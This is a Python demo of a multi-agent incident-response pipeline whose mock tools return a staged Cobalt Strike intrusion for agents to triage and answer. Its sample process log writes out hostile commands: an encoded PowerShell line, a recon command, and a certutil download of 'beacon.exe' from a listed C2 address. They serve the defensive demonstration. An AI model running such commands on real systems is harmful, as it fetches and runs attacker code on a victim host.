"""
Standalone Cyber Guardian: multi-agent incident response with Runner API.

Unlike the adk/ version (loaded by `adk web`), this script runs the full
4-agent pipeline from the command line. It demonstrates:
  - Building a multi-agent system with sub-agents and a planner
  - Using the Runner API for programmatic control
  - Mock security tools returning realistic incident data
  - Extended thinking via BuiltInPlanner + ThinkingConfig

Requires:
  - GOOGLE_API_KEY in the environment (or .env file)

Usage:
  python3 agent.py

Based on google/adk-samples/cyber-guardian-agent (Apache 2.0).
"""

import asyncio
import json
import logging
import os
import uuid

from dotenv import load_dotenv
from google.adk.agents import Agent
from google.adk.planners import BuiltInPlanner
from google.adk.runners import Runner
from google.adk.sessions import InMemorySessionService
from google.adk.tools import FunctionTool
from google.genai import types

load_dotenv()
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Mock data: realistic security incident (Cobalt Strike C2 via certutil)
# ---------------------------------------------------------------------------

MOCK_ASSETS = {
    "srv-web-prod-01": {
        "Owner": "platform-team",
        "BusinessCriticality": "Critical",
        "OS": "Ubuntu 22.04",
        "AssetType": "Web Server",
    },
    "ws-dev-042": {
        "Owner": "dev-team",
        "BusinessCriticality": "Medium",
        "OS": "Windows 11",
        "AssetType": "Workstation",
    },
}

MOCK_THREAT_INTEL = {
    "185.220.101.42": {
        "IsMalicious": True,
        "ThreatName": "Cobalt Strike C2",
        "Confidence": "High",
        "IOC_Type": "IP",
    },
    "d8e8fca2dc0f896fd7cb4cb0031ba249": {
        "IsMalicious": True,
        "ThreatName": "Mimikatz Credential Dumper",
        "Confidence": "Critical",
        "IOC_Type": "MD5",
    },
}

MOCK_PROCESS_EVENTS = [
    {
        "EventTimestamp": "2026-04-08T14:23:01Z",
        "Hostname": "srv-web-prod-01",
        "ProcessName": "powershell.exe",
        "ParentProcessName": "w3wp.exe",
        "CommandLine": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
        "Username": "SYSTEM",
    },
    {
        "EventTimestamp": "2026-04-08T14:23:05Z",
        "Hostname": "srv-web-prod-01",
        "ProcessName": "cmd.exe",
        "ParentProcessName": "powershell.exe",
        "CommandLine": "cmd /c whoami /all > C:\\Windows\\Temp\\recon.txt",
        "Username": "SYSTEM",
    },
    {
        "EventTimestamp": "2026-04-08T14:23:12Z",
        "Hostname": "srv-web-prod-01",
        "ProcessName": "certutil.exe",
        "ParentProcessName": "cmd.exe",
        "CommandLine": "certutil -urlcache -f http://185.220.101.42/beacon.exe C:\\Windows\\Temp\\svc.exe",
        "Username": "SYSTEM",
    },
]

MOCK_NETWORK_CONNECTIONS = [
    {
        "log_timestamp": "2026-04-08T14:23:15Z",
        "source_host": "srv-web-prod-01",
        "source_ip": "10.0.1.15",
        "destination_ip": "185.220.101.42",
        "destination_port": 443,
        "protocol": "TCP",
    },
    {
        "log_timestamp": "2026-04-08T14:25:30Z",
        "source_host": "srv-web-prod-01",
        "source_ip": "10.0.1.15",
        "destination_ip": "185.220.101.42",
        "destination_port": 8443,
        "protocol": "TCP",
    },
]

MOCK_PLAYBOOKS = {
    "Cobalt Strike C2": [
        {"ActionCommand": "block-ip", "Target": "185.220.101.42 at perimeter firewall", "RequiresApproval": False},
        {"ActionCommand": "isolate-host", "Target": "srv-web-prod-01", "RequiresApproval": True},
        {"ActionCommand": "reset-credentials", "Target": "SYSTEM account on srv-web-prod-01", "RequiresApproval": True},
        {"ActionCommand": "collect-forensics", "Target": "Memory dump from srv-web-prod-01", "RequiresApproval": False},
    ],
}

MOCK_INCIDENTS = []


# ---------------------------------------------------------------------------
# Tool functions
# ---------------------------------------------------------------------------

def triageQueryTool(hostname: str, alert_type: str) -> str:
    """Check for duplicate incidents and enrich a host with business context.

    Args:
        hostname: The hostname from the alert.
        alert_type: The type of the alert (e.g., 'IOC_MATCH', 'EDR_DETECTION').
    """
    for incident in MOCK_INCIDENTS:
        if incident["hostname"] == hostname and incident["alert_type"] == alert_type:
            return json.dumps({"is_duplicate": True, "existing_incident": incident["incident_id"]})

    asset = MOCK_ASSETS.get(hostname)
    if asset:
        return json.dumps({"is_duplicate": False, "asset_context": asset})
    return json.dumps({"is_duplicate": False, "asset_context": {"Owner": "Unknown", "BusinessCriticality": "Unknown"}})


def investigationQueryTool(
    alert_type: str,
    hostname: str,
    parent_process: str = None,
    destination_ip: str = None,
) -> str:
    """Investigate an alert by querying endpoint and network logs.

    Args:
        alert_type: The type of alert ('EDR_DETECTION', 'IOC_MATCH').
        hostname: The hostname to investigate.
        parent_process: (Optional) The parent process for EDR alerts.
        destination_ip: (Optional) The malicious IP for IOC_MATCH alerts.
    """
    if alert_type == "EDR_DETECTION":
        events = [e for e in MOCK_PROCESS_EVENTS if e["Hostname"] == hostname]
        if parent_process:
            events = [e for e in events if e["ParentProcessName"] == parent_process]
        return json.dumps(events)

    if alert_type == "IOC_MATCH" and destination_ip:
        connections = [
            c for c in MOCK_NETWORK_CONNECTIONS
            if c["source_host"] == hostname and c["destination_ip"] == destination_ip
        ]
        return json.dumps(connections)

    return json.dumps({"error": "No matching investigation type."})


def threatIntelQueryTool(indicators: list) -> str:
    """Enrich indicators of compromise using the threat intelligence knowledge base.

    Args:
        indicators: List of IOC values (IPs, hashes, domains) to look up.
    """
    results = []
    for ioc in indicators:
        intel = MOCK_THREAT_INTEL.get(ioc)
        if intel:
            results.append({"IOC_Value": ioc, **intel})
        else:
            results.append({"IOC_Value": ioc, "IsMalicious": False, "ThreatName": "Unknown", "Confidence": "Unknown"})
    return json.dumps(results)


def getPlaybookTool(triggering_condition: str) -> str:
    """Retrieve the response playbook for a given threat.

    Args:
        triggering_condition: The threat name (e.g., 'Cobalt Strike C2').
    """
    playbook = MOCK_PLAYBOOKS.get(triggering_condition)
    if not playbook:
        for key, value in MOCK_PLAYBOOKS.items():
            if key.lower() in triggering_condition.lower():
                playbook = value
                break
    if playbook:
        return json.dumps(playbook)
    return json.dumps({"error": f"No playbook found for: {triggering_condition}"})


def responseExecutionTool(action: str, target: str) -> str:
    """Simulate executing a response action (IP block, host isolation, etc.).

    Args:
        action: The action command (e.g., 'block-ip', 'isolate-host').
        target: The target of the action.
    """
    logger.info(f"[SIMULATED] Executing '{action}' on target '{target}'")
    return json.dumps({"status": "success", "action": action, "target": target, "note": "simulated"})


def createIncidentTool(alert_type: str, hostname: str, user: str, severity: str) -> str:
    """Create a new incident record.

    Args:
        alert_type: The type of the alert.
        hostname: The primary host involved.
        user: The primary user involved.
        severity: The severity (e.g., 'Critical', 'High').
    """
    incident_id = f"INC-{str(uuid.uuid4())[:8]}"
    MOCK_INCIDENTS.append({
        "incident_id": incident_id,
        "alert_type": alert_type,
        "hostname": hostname,
        "user": user,
        "severity": severity,
    })
    logger.info(f"[SIMULATED] Created incident {incident_id}")
    return json.dumps({"status": "success", "incident_id": incident_id})


# ---------------------------------------------------------------------------
# Sub-agent definitions
# ---------------------------------------------------------------------------

# Sub-agents use gemini-2.0-flash (cheaper, no thinking needed).
# The orchestrator uses gemini-2.5-flash (supports extended thinking).
MODEL = os.getenv("MODEL_ID", "gemini-2.0-flash")
ORCHESTRATOR_MODEL = os.getenv("ORCHESTRATOR_MODEL", "gemini-2.5-flash")

triage_agent = Agent(
    model=MODEL,
    name="triage_agent",
    description="Assesses alert severity, deduplication, and asset context",
    instruction=(
        "You are the Triage Agent. Check for duplicates and enrich with asset context.\n"
        "Tool: triageQueryTool(hostname, alert_type).\n"
        "Return JSON with is_duplicate, asset_context, summary.\n"
        "ALWAYS transfer back to the root agent after returning findings."
    ),
    tools=[FunctionTool(triageQueryTool)],
    output_key="triage_agent_output",
)

threatintel_agent = Agent(
    model=MODEL,
    name="threat_intel_agent",
    description="Enriches IPs, domains, and hashes with threat intelligence context",
    instruction=(
        "You are the Threat Intel Agent. Assess IOC maliciousness.\n"
        "Tool: threatIntelQueryTool(indicators).\n"
        "Return JSON list with ioc, is_malicious, threat_name, confidence.\n"
        "ALWAYS transfer back to the root agent after returning findings."
    ),
    tools=[FunctionTool(threatIntelQueryTool)],
    output_key="threatintel_agent_output",
)

investigation_agent = Agent(
    model=MODEL,
    name="investigation_agent",
    description="Performs incident investigation using endpoint and network logs",
    instruction=(
        "You are the Investigation Agent. Build attack timelines and find IOCs.\n"
        "Tool: investigationQueryTool(alert_type, hostname, parent_process, destination_ip).\n"
        "Return JSON with attack_timeline, confirmed_connections, derived_iocs.\n"
        "ALWAYS transfer back to the root agent after returning findings."
    ),
    tools=[FunctionTool(investigationQueryTool)],
    output_key="investigation_agent_output",
)

response_agent = Agent(
    model=MODEL,
    name="response_agent",
    description="Recommends and triggers incident response actions",
    instruction=(
        "You are the Response Agent. Select playbooks and recommend actions.\n"
        "Tools: getPlaybookTool(triggering_condition), responseExecutionTool(action, target).\n"
        "Return JSON with recommended_actions. Flag requires_approval for dangerous actions.\n"
        "ALWAYS transfer back to the root agent after returning findings."
    ),
    tools=[FunctionTool(responseExecutionTool), FunctionTool(getPlaybookTool)],
    output_key="response_agent_output",
)

# ---------------------------------------------------------------------------
# Root orchestrator
# ---------------------------------------------------------------------------

ORCHESTRATOR_INSTRUCTION = """
Role: You are the Cyber Guardian orchestrator for cybersecurity incident response.

Objective: Parse raw alert text, classify it, and delegate to sub-agents:
  1. triage_agent: check duplicates, enrich with asset context (call FIRST)
  2. threat_intel_agent: enrich IOCs with threat intelligence
  3. investigation_agent: deep technical analysis (process trees, network logs)
  4. response_agent: recommend and simulate response actions (call LAST)

For IOC-heavy alerts: triage -> threat_intel -> investigation -> response.
For EDR alerts: triage -> investigation -> threat_intel -> response.
If triage finds a duplicate, STOP and report it.
Flag any response actions that require human approval.
"""

root_agent = Agent(
    model=ORCHESTRATOR_MODEL,
    name="cyber_guardian_orchestrator",
    description="Orchestrates multi-agent cybersecurity incident response",
    instruction=ORCHESTRATOR_INSTRUCTION,
    planner=BuiltInPlanner(
        thinking_config=types.ThinkingConfig(
            include_thoughts=True,
            thinking_budget=512,
        )
    ),
    sub_agents=[threatintel_agent, investigation_agent, triage_agent, response_agent],
)


# ---------------------------------------------------------------------------
# Main: run with Runner API
# ---------------------------------------------------------------------------

SAMPLE_ALERT = (
    "ALERT: IOC_MATCH detected on host srv-web-prod-01 by user svc-apache. "
    "Outbound connection to 185.220.101.42:443 flagged by network IDS. "
    "Process: certutil.exe downloading from 185.220.101.42."
)


async def async_main():
    ss = InMemorySessionService()
    session = await ss.create_session(
        app_name="cyber_guardian_app",
        user_id="analyst",
        state={},
    )

    alert_text = os.getenv("ALERT_TEXT", SAMPLE_ALERT)
    print(f"Alert: {alert_text}\n")

    content = types.Content(
        role="user",
        parts=[types.Part(text=alert_text)],
    )

    runner = Runner(
        app_name="cyber_guardian_app",
        agent=root_agent,
        session_service=ss,
    )

    print("Running Cyber Guardian pipeline...\n")
    async for event in runner.run_async(
        session_id=session.id,
        user_id=session.user_id,
        new_message=content,
    ):
        if event.content and event.content.parts:
            for part in event.content.parts:
                if part.text:
                    print(f"[{event.author}] {part.text}\n")
                elif part.function_call:
                    print(f"[{event.author}] calling: {part.function_call.name}({dict(part.function_call.args)})")

    print("\nDone.")


if __name__ == "__main__":
    if not os.getenv("GOOGLE_API_KEY"):
        raise EnvironmentError(
            "Set GOOGLE_API_KEY in your environment or .env file.\n"
            "Get one from https://aistudio.google.com/"
        )
    asyncio.run(async_main())
